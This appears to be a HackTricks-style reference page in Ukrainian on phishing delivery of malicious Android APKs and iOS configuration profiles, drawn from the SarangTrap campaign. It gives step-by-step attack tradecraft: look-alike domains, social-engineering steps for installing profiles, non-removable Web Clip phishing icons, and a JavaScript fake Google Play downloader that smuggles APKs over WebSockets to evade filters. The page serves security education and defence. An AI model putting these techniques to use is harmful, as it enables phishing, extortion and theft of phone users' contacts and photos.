# Mobile Phishing & Malicious App Distribution (Android & iOS)

> [!INFO]
> На цій сторінці описано techniques, які threat actors використовують для поширення **malicious Android APKs** та **iOS mobile-configuration profiles** через phishing (SEO, social engineering, fake stores, dating apps тощо).
> Матеріал адаптовано з кампанії SarangTrap, викритої Zimperium zLabs (2025), та інших публічних досліджень.<sup>[[1]](#references)</sup>

## Сценарій атаки

1. **SEO/Phishing Infrastructure**
* Зареєструвати десятки look-alike domains (dating, cloud share, car service…).
– Використовувати keywords місцевою мовою та emojis в елементі `<title>`, щоб підвищити ranking у Google.
– Розмістити instructions зі встановлення як Android (`.apk`), так і iOS на одній landing page.
2. **First Stage Download**
* Android: direct link на *unsigned* APK або APK із “third-party store”.
* iOS: `itms-services://` або plain HTTPS link на malicious **mobileconfig** profile (див. нижче).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection та інша post-install malware behaviour описані на окремій сторінці Android Malware Post-Exploitation нижче.
4. **iOS Delivery Technique**
* Один **mobile-configuration profile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб enroll-ити device у supervision, подібний до “MDM”.
* Social-engineering instructions:
1. Відкрити Settings ➜ *Profile downloaded*.
2. Тричі натиснути *Install* (screenshots на phishing page).
3. Довіритися unsigned profile ➜ attacker отримує entitlement на *Contacts* та *Photo* без App Store review.
5. **iOS Web Clip Payload (phishing app icon)**
* Payloads `com.apple.webClip.managed` можуть **закріпити phishing URL на Home Screen** із branded icon/label.
* Web Clips можуть працювати у **full-screen** (приховує browser UI) і бути позначені як **non-removable**, змушуючи victim видалити profile, щоб прибрати icon.<sup>[[3]](#references)</sup>
6. **Network Layer**
* Plain HTTP, часто на port 80 із HOST header на кшталт `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко виявити).

## Android Malware Post-Exploitation

Щодо tradecraft Android malware після встановлення, зокрема C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS та persistence, дивіться:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers дедалі частіше замінюють static APK links на Socket.IO/WebSocket channel, вбудований у lures, що виглядають як Google Play. Це приховує payload URL, обходить URL/extension filters і зберігає реалістичний install UX.<sup>[[2]](#references)[[4]](#references)</sup>

Типовий client flow, який спостерігали in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Чому це обходить прості засоби контролю:
- Статична URL-адреса APK не розкривається; payload відновлюється в пам’яті з WebSocket-фреймів.
- Фільтри URL/MIME/розширень, які блокують прямі відповіді .apk, можуть не виявити бінарні дані, тунельовані через WebSockets/Socket.IO.
- Crawlers і URL sandbox, які не виконують WebSockets, не отримають payload.

Див. також WebSocket tradecraft та інструменти:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Темний бік романтики: кампанія вимагання SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Налаштування payload Web Clips для пристроїв Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan, націлений на користувачів Android з Індонезії та В’єтнаму](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
